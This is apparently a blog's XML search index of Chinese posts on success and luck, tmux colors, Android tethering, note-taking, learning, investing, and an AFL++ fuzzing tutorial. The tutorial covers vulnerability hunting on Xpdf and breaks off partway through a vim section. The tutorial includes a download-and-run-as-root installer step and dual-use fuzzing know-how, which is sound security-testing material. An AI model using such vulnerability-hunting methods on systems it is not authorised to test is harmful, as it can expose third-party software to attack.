<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>读《运气与努力》有感</title>
    <link href="/cn/luck_and_success/"/>
    <url>/cn/luck_and_success/</url>
    
    <content type="html"><![CDATA[<p>我感觉《运气与努力》这篇博客是 2024 年看过的最好的几篇之一，在终生学习，成功与运气等多方面产生了共鸣，我们面对的是一个复杂的世界，能够把握的东西只是极少数。</p><h2 id="关于成功的要素"><a href="#关于成功的要素" class="headerlink" title="关于成功的要素"></a>关于成功的要素</h2><p>这些年看了很多关于成功学方法论的文章，答案是没有银弹 (No silver bullet) ，没有什么秘技可以一步登天。</p><p>单伟建在母校旧金山大学的一次演讲中说，在任何领域取得成功，最重要的是三方面：</p><ol><li>坚持终生学习 (keep learning)</li><li>好的判断力（good judgement）</li><li>运气 (good luck)</li></ol><p>这和我前段时间发的「工程师把事情做好的三条边」中的说法有关联，工程师要把事情做好必须从最下面的基线，沿着绳索向上爬。</p><div class="note note-secondary">            <ul><li>最下面一条线是基线，可以理解为人类所掌握的工程知识</li><li>最上面一条线是极限，极限是理论给出的，极限无法突破</li><li>中间那条线是从基线向极限向上攀登的绳索。</li></ul>          </div><p>虽然文中说的是工程师，生活中的很多事也是适用的。终生学习是为了提高自己的基线，以增加自己正确判断方向的概率，至于编制的绳索能爬多高，真要靠点运气。</p><p>运气很难以捉摸，到底是时势造英雄，还是英雄造时势，也挺难说清楚 ？承认运气让人更加谦虚，大多成功都是个人碰运气加努力奋斗的结果。但是机会总是垂青有准备的人，当运气来的时候，就看能不能抓住了。</p><p>文中还提及一点， Angela Duckworth 强调的毅力（grit）的作用，我习惯用词 “坚持不懈”，坚持很重要。坚持不懈的力量很容易被忽略，就像人们总是强调「刻意练习」而不再提「一万小时定律」一样。时间是最公平的，每个人一天都只有 24 小时，你把时间花在哪里，哪里就会有进步，虽然进步可大可小，但几乎总是比不花时间要好。</p><p><strong>故事1</strong></p><p>得到课程《香帅的北大金融学课》是一门热门课程，参加学习的人很多大概有 36 万。</p><p>从「01 金融世界观」开始，每节课程平均有 30 多万人学习，到最后的「09 金融思维方法论」，每节课平均会有多少人学习 ？ 答案是 10 万人左右，差不多有 2&#x2F;3 的人没有学完（保守估算，香帅老师的这门课程是 2017 年 12 月开课，到现在已经6 年多了）。</p><p><strong>故事2</strong></p><p>OpenAI 是一个很好的例子，选对了方向大模型，从 GPT-1 开始，GPT-2, GPT-3, 一直到 GPT-3.5 一鸣惊人，用一句话总结：OpenAI 做对选择并坚持了下去，期间找到“贵人”微软相助守住了这份少年意气 ：)</p><h2 id="关于付费群"><a href="#关于付费群" class="headerlink" title="关于付费群"></a>关于付费群</h2><p>关于付费群值不值得加入的问题，我有些不同的看法，我认为绝大多数付费群不值得加入。</p><p>有的群卖的是真的「信息差」，这些资料在互联网上是公开的，可以免费获取，即使获得了也用处不大。</p><p>一些行业内的大咖，互联网知名人士的课程，还是有一些意义的，有些业内人士认为的「常识」，对普通人也是有帮助的，但还是需要很强的鉴别能力，倘若价格不菲真要考虑值不值得。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><p>运气与努力 - 江宏,  May 31, 2024<br><a href="https://1byte.io/articles/luck/">https://1byte.io/articles/luck/</a></p></li><li><p>尤雨溪谈成功和运气<br><a href="https://www.usmacd.com/cn/youyuxi/">https://www.usmacd.com/cn/youyuxi/</a></p></li><li><p>公开写作的好处和坚持不懈<br><a href="https://www.usmacd.com/cn/public_writing/">https://www.usmacd.com/cn/public_writing/</a></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>为 tmux 设置真彩色</title>
    <link href="/cn/tmux_truecolor/"/>
    <url>/cn/tmux_truecolor/</url>
    
    <content type="html"><![CDATA[<p>最近在 tmux 中使用 vim onedark theme，总是觉得怪怪的，黑色显示偏灰。无意中发现 <code>joshdick/onedark.vim</code> 中提到需要为 tmux 设置真彩色。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">- Plain ASCII<br>- ANSI escape codes: 16 color codes with bold/italic and background<br>- 256 color palette: 216 colors + 16 ANSI + 24 gray (colors are 24-bit)<br>- 24-bit truecolor: &quot;888&quot; colors (aka 16 million)<br></code></pre></td></tr></table></figure><p>检查终端是否支持真彩色，可以使用脚本 <a href="https://raw.githubusercontent.com/gnachman/iTerm2/master/tests/24-bit-color.sh">24-bit-color.sh</a></p><p><code>bash ./24-bit-color.sh</code> 如果终端颜色是连贯的则支持了真彩色，如果颜色是分块的则没有支持。</p><p>修改 ~&#x2F;.tmux.conf 加上两行</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">set -g default-terminal &quot;tmux-256color&quot;<br>set-option -ga terminal-overrides &quot;,$&#123;TERM&#125;:Tc&quot;<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">default-terminal terminal<br>        Set the default terminal for new windows created in this session - the default value of the TERM environment variable.  For tmux to work correctly, this must be  set  to<br>        ‘screen’, ‘tmux’ or a derivative of them.<br><br><br>terminal-overrides[] string<br>        Allow  terminal  descriptions  read  using  terminfo(5)  to  be  overridden.   Each  entry  is a colon-separated string made up of a terminal type pattern (matched using<br>        fnmatch(3)) and a set of name=value entries.<br><br>        For example, to set the ‘clear’ terminfo(5) entry to ‘\e[H\e[2J’ for all terminal types matching ‘rxvt*’:<br><br>                rxvt*:clear=\e[H\e[2J<br><br>        The terminal entry value is passed through strunvis(3) before interpretation.<br></code></pre></td></tr></table></figure><p>要让 tmux 重新加载 <code>~/.tmux.conf</code> 需要退出所有的 tmux 进程后，重新执行 tmux 。最后，检查你的 tmux 是否开启了真彩色，可以使用下面的命令行：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">tmux info | grep Tc<br> 227: Tc: (flag) true<br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>Adding 24-bit TrueColor RGB escape sequences to tmux - Suraj N. Kurapati , 29 January 2016<br><a href="https://sunaku.github.io/tmux-24bit-color.html#usage">https://sunaku.github.io/tmux-24bit-color.html#usage</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android 系统的 USB Tethering 功能</title>
    <link href="/cn/android_usb_tethering/"/>
    <url>/cn/android_usb_tethering/</url>
    
    <content type="html"><![CDATA[<p>Android 系统的 USB Tethering 可以共享 Android 手机的 Internet 连接，使用这个功能后，如果 Android 能够通过 Wi-Fi上网或者移动数据网络上网，则你的电脑也能够通过USB数据线共享网络上网了。</p><p>Android 手机的设置方法：Settings &#x3D;&gt; Network &amp; internet &#x3D;&gt; Hotspot &amp; tethering &#x3D;&gt; USB tethering</p><p>不同厂商的系统名字可能不同，ColorOS 上叫 「USB 网络共享」。</p><p>用 USB 数据线连接 Android 手机和 PC 后，在 Android 系统中开启 USB 网络共享，我的Fedora linux 可以利用 Android 的网络上网了（Windows 系统应该也可以）。Fedora linux 自动添加了一个网络连接， linux  PC 和 Android 手机处于同一局域网下。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx">        <span class="hljs-attribute">IPv4</span> 地址：<span class="hljs-number">192.168.203.204</span><br>    IPv4 默认网关：<span class="hljs-number">192.168.203.74</span><br>IPv4 主域名服务器：<span class="hljs-number">192.168.203.74</span><br></code></pre></td></tr></table></figure><p>Androd 手机可以通过 192.168.203.204 访问 PC 。linux 和 Android 在同一局域网下，文件传输就很多办法了。有推油提示， 在 PC 端执行 python -m http.server 手机端可以用浏览器访问下载 PC 上的文件。</p><p>注：Windows 系统和 Fedora Linux 不同的是系统会弹出一个提示，点击确认后才会和 Android 手机建立网络连接。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>Share a mobile connection by hotspot or tethering on Android<br><a href="https://support.google.com/android/answer/9059108?hl=en">https://support.google.com/android/answer/9059108?hl=en</a></p><p>What is USB Tethering and How to Enable it?    12 Mar, 2021<br><a href="https://www.geeksforgeeks.org/what-is-usb-tethering-and-how-to-enable-it/">https://www.geeksforgeeks.org/what-is-usb-tethering-and-how-to-enable-it/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>知识管理的几个误区</title>
    <link href="/cn/PKM_faults/"/>
    <url>/cn/PKM_faults/</url>
    
    <content type="html"><![CDATA[<p>查理·芒格曾多次在采访中提到，自己一辈子只研究两件事情：第一种是发现什么有效，然后实践它；第二种是发现什么是无效的，然后规避它。查理·芒格会花费大量时间来研究什么事会失败，尽可能减少认知偏差。</p><p>我在知识管理方面犯过不少错误，向芒格学习总结知识管理的几个错误。</p><h2 id="完美工具陷阱-perfect-tool-trap"><a href="#完美工具陷阱-perfect-tool-trap" class="headerlink" title="完美工具陷阱 (perfect tool trap)"></a>完美工具陷阱 (perfect tool trap)</h2><h3 id="频繁切换笔记软件-笔记格式-博客系统"><a href="#频繁切换笔记软件-笔记格式-博客系统" class="headerlink" title="频繁切换笔记软件&#x2F;笔记格式&#x2F;博客系统"></a>频繁切换笔记软件&#x2F;笔记格式&#x2F;博客系统</h3><p>我先后使用过 EverNote，WizNote，VNote，CSDN blog，Google blogspot, WordPress，最终只造成知识、文章散落在多个互联网角落。我先后使用过 txt, orgmode, markdown，富文本等多种格式，最终只造成各种格式转换烦恼。</p><p>现实中并不存在一个 All in One 的完美工具，每个工具都有其长处和短处，接受工具的不完美，哪个工具合适就用哪个工具。</p><p>新的工具层出不穷，不断吸引你去使用它，但使用一个新工具并不能提高你的工作效率，只是新鲜的刺激感让你感觉良好。</p><h2 id="过度优化陷阱-the-optimization-trap"><a href="#过度优化陷阱-the-optimization-trap" class="headerlink" title="过度优化陷阱 (the optimization trap)"></a>过度优化陷阱 (the optimization trap)</h2><h3 id="不断修改笔记结构-structure-，打造完美系统"><a href="#不断修改笔记结构-structure-，打造完美系统" class="headerlink" title="不断修改笔记结构 (structure)，打造完美系统"></a>不断修改笔记结构 (structure)，打造完美系统</h3><p>不将重点放在可以采取的行动上，对外在表现形式的关注，远远大于对知识内容的关注。试图设计复杂的标签系统，笔记层次，笔记方法，来打造一个完美的系统。</p><p>真相是：复杂的系统只是让你感到你自己很「聪明」，用纸和笔记录信息，同样可以推动项目取得进展。</p><h3 id="频繁整理-组织笔记的「洁癖」"><a href="#频繁整理-组织笔记的「洁癖」" class="headerlink" title="频繁整理&#x2F;组织笔记的「洁癖」"></a>频繁整理&#x2F;组织笔记的「洁癖」</h3><p>大量堆积的笔记将造成知识整理冲动，试图将每条笔记精确地放到每个分类，错综复杂的笔记联接，多来几次就会影响坚持记录的信心。</p><p>数字笔记系统最大的优势在于你可以使用「搜索」功能来查找笔记内容，适度保持笔记的混杂度，将大大降低心理负担。</p><p>真相是：一旦记录的笔记可以为你所用，可以推动项目的进展，你将不再执着于某种「先进」的笔记组织形式。</p><h2 id="缺乏标准陷阱-（lack-of-recording-standard-trap）"><a href="#缺乏标准陷阱-（lack-of-recording-standard-trap）" class="headerlink" title="缺乏标准陷阱 （lack of recording standard trap）"></a>缺乏标准陷阱 （lack of recording standard trap）</h2><h3 id="缺少内容选择标准，各种有用，无用的笔记堆积在一起"><a href="#缺少内容选择标准，各种有用，无用的笔记堆积在一起" class="headerlink" title="缺少内容选择标准，各种有用，无用的笔记堆积在一起"></a>缺少内容选择标准，各种有用，无用的笔记堆积在一起</h3><p>由于没有严格地区分，自己所负责的责任范围和业余的兴趣爱好，缺乏信息选择标准，导致笔记系统变成各种类别的信息收集器，而不是成为你在某个领域精进的推动器。</p><p>记录了大量一瞬间的灵感，好的想法将淹没在大量的突发奇想中，我们每天大多数的想法没有太大意义，而那些可能具有重大有意义的想法我们必须将他们识别出来。</p><h3 id="缺乏明确的记录标准，无视笔记的「复利」效应"><a href="#缺乏明确的记录标准，无视笔记的「复利」效应" class="headerlink" title="缺乏明确的记录标准，无视笔记的「复利」效应"></a>缺乏明确的记录标准，无视笔记的「复利」效应</h3><p>只记录特定项目相关的笔记，将导致项目期间有趣的观点或者想法信息丢失。不从进行的项目中提炼知识，经验、方法，无视笔记的复利效应，将不断掉入「重复劳动」的陷阱。</p><h2 id="只顾记录，从不回顾-The-Lack-of-Reflection"><a href="#只顾记录，从不回顾-The-Lack-of-Reflection" class="headerlink" title="只顾记录，从不回顾 (The Lack of Reflection)"></a>只顾记录，从不回顾 (The Lack of Reflection)</h2><p>增援未来的自己，是记笔记的主要目的之一，笔记可能给未来的自己带来解决问题的思路和线索。在很长的时间跨度中，不可能记住所有笔记的内容，所以就需要定期回顾笔记。</p><p>回顾笔记是用新视角去审视旧想法，总体来说人是会不断进步的，回顾笔记给知识迭代创造机会。</p><h2 id="思考与总结"><a href="#思考与总结" class="headerlink" title="思考与总结"></a>思考与总结</h2><h3 id="「混杂陷阱」的思考-The-‘Messy’-Notes-Trap"><a href="#「混杂陷阱」的思考-The-‘Messy’-Notes-Trap" class="headerlink" title="「混杂陷阱」的思考 (The ‘Messy’ Notes Trap)"></a>「混杂陷阱」的思考 (The ‘Messy’ Notes Trap)</h3><p>笔记「混杂」是很多人知识管理失败的主要原因，混杂无法形成群聚效应，也就无法最大的发挥笔记的效用。有人提议用「原子笔记」来解决，但真正的问题是缺乏标准导致的混杂。</p><h3 id="知识管理的关键"><a href="#知识管理的关键" class="headerlink" title="知识管理的关键"></a>知识管理的关键</h3><p>知识管理系统最重要的是在同一个地方，用同样的格式和一致的标准记录你的洞见。持续不断记录，意义自然浮现。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] Personal knowledge management is NOT work - Sam Matla<br><a href="https://www.youtube.com/watch?v=baKCC2uTbRc">https://www.youtube.com/watch?v=baKCC2uTbRc</a></p><p>[2] How to Take Smart Notes - Sönke Ahrens</p><p>[3] Build a second brain - Tiago Forte</p>]]></content>
    
    
    
    <tags>
      
      <tag>PKM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>也许学校根本没有教你如何学习：论什么是真正的自学</title>
    <link href="/cn/learn_method/"/>
    <url>/cn/learn_method/</url>
    
    <content type="html"><![CDATA[<p>这是一则笔记，总结了少数派原文的要点，该文章中谈及了学习的两个原始模型，对我有较大启发，分享出来，希望对大家有所帮助。分享方法的文章是真正的「授人以渔」，难能可贵，供大家参考。</p><p><a href="https://sspai.com/post/87551">https://sspai.com/post/87551</a></p><h2 id="学习的两个原始模型"><a href="#学习的两个原始模型" class="headerlink" title="学习的两个原始模型"></a>学习的两个原始模型</h2><p>应试学习和自主学习，两者完全不同。情境和体验，两项对学习至关重要的因素，长久以来在应试体系中是严重缺位的。很多学生在上学时，都有这样困惑，我学这些知识是用来干啥的 ？</p><p>人类学习的有两个原始模型：<br>1）实验，试错，反复纠正，总结实验的结果<br>2）模仿有经验的人，有问题就去请教，直到自己成为有经验的人。</p><p>做实验和当学徒，两种模式是启发和反馈的开放模型。自主学习应该以体验为核心，将学习目标和实际效用联系起来，最好能立刻看到目标对应的结果。</p><p>学编程：✖️ 天书般的知识体系  ✔️ 先搞一个简单的个人网站<br>学英语：✖️ 语法攻略，单词大全  ✔️ 从最基本的高频核心单词入手，输入大量语料，开着字幕看自己喜欢的简单英语视频<br>学运营：✖️ 价值 998 的全套手把手教程 ✔️ 明确自己要做的方向 ，找一些这些方向的头部号，看它里面最好的那几篇内容，分析它为什么好</p><h2 id="如何提高学习效率"><a href="#如何提高学习效率" class="headerlink" title="如何提高学习效率"></a>如何提高学习效率</h2><p>每天完成三个周期，每个周期一个半小时，这是一个成年人可以维持高注意力的平均时长。<br>20 分钟热身期 + 1 个小时左右的专注期 &#x3D; 一个半小时完整学习周期。</p><h2 id="如何制定一个好目标"><a href="#如何制定一个好目标" class="headerlink" title="如何制定一个好目标"></a>如何制定一个好目标</h2><p>目标最小化原则: 一个具体的目标，越小越好，执行起来越不费劲越好<br>Done than perfect: 克服完美主义，以完成任务为目标。</p>]]></content>
    
    
    
    <tags>
      
      <tag>KNOWLEDGE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>李录谈价值投资</title>
    <link href="/cn/lilu/"/>
    <url>/cn/lilu/</url>
    
    <content type="html"><![CDATA[<h2 id="价值投资是大道"><a href="#价值投资是大道" class="headerlink" title="价值投资是大道"></a>价值投资是大道</h2><p>价值投资的理念只有四个。</p><p>1）买股票是投资一个公司：股票是公司的所有权，公司在创造价值的过程中，作为部分所有者，拥有的部分价值也会增长</p><p>2）忽略短期波动：市场不能告诉你价值，只能告诉你价格，你只能把它当作一个可以利用的工具</p><p>3）注重安全边际：因为无法对未来预测，做判断是要预留很大空间，买入价格要大大低于内在价值</p><p>4）建立能力圈：通过不断努力，在某些行业获得比几乎所有人更深认识，从而能对公司长期表现作出比所有其他人更准确的判断</p><p>前三条自来本杰明·格雷厄姆，最后一条来自沃伦·巴菲特。</p><h2 id="价值投资的难点"><a href="#价值投资的难点" class="headerlink" title="价值投资的难点"></a>价值投资的难点</h2><p>1）价值投资虽然是通向成功的大路，但是这个道路太长了。也许你买的时候价格远低于内在价值，但你不知道市场什么时候变得理性。同时公司的价值要增长，要公司管理层和上上下下的人员共同努力，是一个很艰难的过程。</p><p>2）你对未来的判断也很难，投资的本事是对未来的预测。真正了解一个公司，一个行业，要能够去判断它未来的5年，10年。</p>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFL++ 漏洞挖掘实例</title>
    <link href="/cn/AFL++%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E4%BE%8B/"/>
    <url>/cn/AFL++%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E4%BE%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="☆-1-模糊测试工具-AFL-AFL-介绍"><a href="#☆-1-模糊测试工具-AFL-AFL-介绍" class="headerlink" title="☆ 1. 模糊测试工具 AFL &#x2F; AFL++介绍"></a>☆ 1. 模糊测试工具 AFL &#x2F; AFL++介绍</h2><p>模糊测试是一种黑盒测试方法，它通过向软件输入随机或异常的数据，来触发软件中的错误或异常。AFL 是 Google 开发的一款 fuzz 工具，它最初由 Michal Zalewski 开发，被设计为一种模糊测试工具，用于自动发现程序中的漏洞。</p><p>在 AFL 之前，模糊测试工具大多采用随机生成输入数据的方法。这种方法虽然简单，但效率低下，很难发现软件中的隐藏路径。AFL 引入了覆盖率导向的模糊测试方法，它会根据软件的执行路径来优化输入数据。这种方法可以有效地提高模糊测试的效率，并更容易发现软件中的隐藏路径。</p><p>AFL 的发布，标志着模糊测试工具进入了新的时代。AFL 的成功，激发了许多其他研究人员和开发人员对模糊测试工具的改进和研究。它对软件安全领域产生了深远的影响。AFL 的成功，证明了模糊测试是一种有效的软件安全测试方法。</p><p>AFL 在模糊测试工具发展史上的具体贡献主要有：<br>1）开创了覆盖率导向模糊测试的新时代<br>2）极大地提高了模糊测试的效率和效果<br>3）激发了其他研究人员和开发人员对模糊测试工具的改进和研究</p><p>AFL作为一款开创性的模糊测试工具，通过不断的发展和改进，已经在网络安全领域取得了显著的历史地位。其自动化特性和有效的漏洞发现能力使其成为安全专业人员首选的工具之一，对软件安全性的提升产生了积极影响。AFL 的成功，证明了模糊测试是一种有效的软件安全测试方法。AFL 的出现，为软件安全领域提供了新的工具和手段，帮助开发人员和安全研究人员发现软件中的安全漏洞。</p><p>AFLplusplus （简称 AFL++）是 AFL 的一个分支，它由 Marc “van Hauser 和其他开发者开发。AFLplusplus 在 AFL 的基础上进行了许多改进，包括：</p><ul><li>更快的执行速度：AFLplusplus 使用了新的编译器插件和其他技术来提高 fuzz 的速度。</li><li>更强大的变异算法：AFLplusplus 提供了更强大的变异算法，可以生成更复杂的输入数据。</li><li>更全面的覆盖率：AFLplusplus 提供了更全面的覆盖率分析，可以帮助开发人员发现软件中的隐藏路径。</li></ul><p>目前 Google 的 oss-fuzz 项目已经使用 AFL++ 替换 AFL 作为其主要 fuzz 工具，AFL++ 在速度、变异算法和覆盖率分析方面都比 AFL 更优秀。</p><h2 id="☆-2-AFL-的安装"><a href="#☆-2-AFL-的安装" class="headerlink" title="☆ 2. AFL++ 的安装"></a>☆ 2. AFL++ 的安装</h2><p>AFL++ 的源码有两个分支，stable 分支 [2] 为发布分支，dev 分支 [3] 为开发分支。dev 分支代码的更新频率很高，也不是很稳定可能出现 bug，推荐使用 stable 分支的源码。以 ubuntu 18.04 为例介绍如何安装 AFLplusplus</p><p>下载源码：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/AFLplusplus/AFLplusplus<br>git submodule update --init --recursive<br></code></pre></td></tr></table></figure><p><strong>git submodule</strong> 这条命令很重要，要不编译一些 AFL++ mode 的时候会因为缺少源码而报错。</p><p>要从源码编译 AFL++ 需要先安装系统的依赖库。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get update<br>sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools curl ninja-build<br></code></pre></td></tr></table></figure><p>AFL++ 在文档中推荐使用 llvm 13+ ,  所以先要升级 Ubuntu 系统的 llvm ，<a href="https://apt.llvm.org/">https://apt.llvm.org/</a> 提供了编译好的 llvm binary 可以下载，也提供了 llvm.sh 可以非常方面的安装新版本的 llvm，下面的例子演示安装 llvm 15</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">wget https://apt.llvm.org/llvm.sh<br><span class="hljs-built_in">chmod</span> +x llvm.sh<br>sudo ./llvm.sh 15 all<br></code></pre></td></tr></table></figure><p>编译 AFL++</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> LLVM_CONFIG=<span class="hljs-string">&quot;llvm-config-15&quot;</span><br>make distrib<br></code></pre></td></tr></table></figure><h2 id="☆-3-AFL-Linux-系统环境配置"><a href="#☆-3-AFL-Linux-系统环境配置" class="headerlink" title="☆ 3. AFL++ Linux 系统环境配置"></a>☆ 3. AFL++ Linux 系统环境配置</h2><p>为了使 AFL++ 在 fuzz 时获得更好的性能，可以使用 root 用户执行下面的脚本， 调整 linux 内核的参数。</p><p><code>sudo bash afl-init.sh</code> </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> 1 &gt;/proc/sys/kernel/sched_child_runs_first<br><span class="hljs-built_in">echo</span> 1 &gt;/proc/sys/kernel/sched_autogroup_enabled<br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/vm/overcommit_memory<br><span class="hljs-built_in">echo</span> core &gt;/proc/sys/kernel/core_pattern<br><span class="hljs-built_in">echo</span> never &gt; /sys/kernel/mm/transparent_hugepage/enabled<br><span class="hljs-built_in">test</span> -e /sys/devices/system/cpu/cpufreq/scaling_governor &amp;&amp; <span class="hljs-built_in">echo</span> performance | <span class="hljs-built_in">tee</span> /sys/devices/system/cpu/cpufreq/scaling_governor<br><span class="hljs-built_in">test</span> -e /sys/devices/system/cpu/cpufreq/policy0/scaling_governor &amp;&amp; <span class="hljs-built_in">echo</span> performance | <span class="hljs-built_in">tee</span> /sys/devices/system/cpu/cpufreq/policy*/scaling_governor<br><span class="hljs-built_in">test</span> -e /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor &amp;&amp; <span class="hljs-built_in">echo</span> performance | <span class="hljs-built_in">tee</span> /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor<br><span class="hljs-built_in">test</span> -e /sys/devices/system/cpu/cpufreq/boost &amp;&amp; <span class="hljs-built_in">echo</span> 1 &gt; /sys/devices/system/cpu/cpufreq/boost<br></code></pre></td></tr></table></figure><h2 id="☆-4-AFL-的基本使用方法"><a href="#☆-4-AFL-的基本使用方法" class="headerlink" title="☆ 4. AFL++ 的基本使用方法"></a>☆ 4. AFL++ 的基本使用方法</h2><h3 id="4-1-编译插桩模糊测试目标软件"><a href="#4-1-编译插桩模糊测试目标软件" class="headerlink" title="4.1 编译插桩模糊测试目标软件"></a>4.1 编译插桩模糊测试目标软件</h3><p>优先使用 llvm clang 对目标软件进行插桩，在最近几年的实战文章中已经很少看到使用 gcc 插桩目标软件的例子。AFL++ 提供了多种插桩方式，可以参考:<br><a href="https://github.com/AFLplusplus/AFLplusplus/tree/stable/instrumentation">https://github.com/AFLplusplus/AFLplusplus/tree/stable/instrumentation</a></p><p>使用  afl-clang-fast&#x2F;afl-clang-fast++ 或者 afl-clang-lto&#x2F;afl-clang-lto++ 可以应对大多数情况，afl-clang-lto&#x2F;afl-clang-lto++ 在编译大型程序的时候可能会失败，如果出现失败的情况，可以换用 afl-clang-fast&#x2F;afl-clang-fast++ 。 下面的示例分别针对三种不同编译系统情况，[a] 使用 Makefile , [b] 使用 cmake，[c] 使用 meson , 需要根据具体情况选择。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">CC=afl-cc CXX=afl-c++ ./configure --disable-shared <span class="hljs-comment"># [a]</span><br>cmake -DCMAKE_C_COMPILERC=afl-cc -DCMAKE_CXX_COMPILER=afl-c++ . <span class="hljs-comment"># [b]</span><br>CC=afl-cc CXX=afl-c++ meson <span class="hljs-comment"># [c]</span><br></code></pre></td></tr></table></figure><p>下载 Xpdf 3.02 作为 fuzz 目标。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz<br>tar -xvzf xpdf-3.02.tar.gz<br></code></pre></td></tr></table></figure><p>编译 Xpdf</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> xpdf<br>CC=afl-cc CXX=afl-c++ ./configure --disable-shared --prefix=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzz_xpdf/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><p>将得到我们的 fuzz 目标  <code>$HOME/fuzz_xpdf/install/bin/pdftotext</code></p><h3 id="4-2-AFL-的命令行参数"><a href="#4-2-AFL-的命令行参数" class="headerlink" title="4.2 AFL++ 的命令行参数"></a>4.2 AFL++ 的命令行参数</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">afl-fuzz -i <span class="hljs-variable">$HOME</span>/AFLplusplus/testcases/others/pdf -o <span class="hljs-variable">$HOME</span>/fuzz_xpdf/out/ -s 123 -- <span class="hljs-variable">$HOME</span>/fuzz_xpdf/install/bin/pdftotext @@ <span class="hljs-variable">$HOME</span>/fuzz_xpdf/output<br></code></pre></td></tr></table></figure><ul><li>-i  输入目录，用于存放初始 testcase</li><li>-o 输出目录，用于存放 afl-fuzz 生成的 testcase</li><li>– 后面接 fuzz 目标的命令行   @@ 代表文件，不写 @@ 代表是从标准输入读取数据</li><li>-s  RNG 的 seed</li></ul><h2 id="☆-5-实战-vim-漏洞挖掘"><a href="#☆-5-实战-vim-漏洞挖掘" class="headerlink" title="☆ 5. 实战 vim 漏洞挖掘"></a>☆ 5. 实战 vim 漏洞挖掘</h2><p>首先需要研究 vim 的命令行参数，默认的配置下 vim 启动速度慢，并且有可能执行外部shell 命令 （不安全），最终需要使用的命令行参数如下：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>-u NONE 跳过初始化<br><span class="hljs-bullet">- </span>-X 加快启动速度<br><span class="hljs-bullet">- </span>-s 安静模式<br><span class="hljs-bullet">- </span>-Z 受限模式 (All commands that make use of an external shell are disabled.)<br><span class="hljs-bullet">- </span>-e 以 Ex 模式运行 vim<br><span class="hljs-bullet">- </span>-S 加载第一个文件后执行文件 &lt;session&gt;<br><span 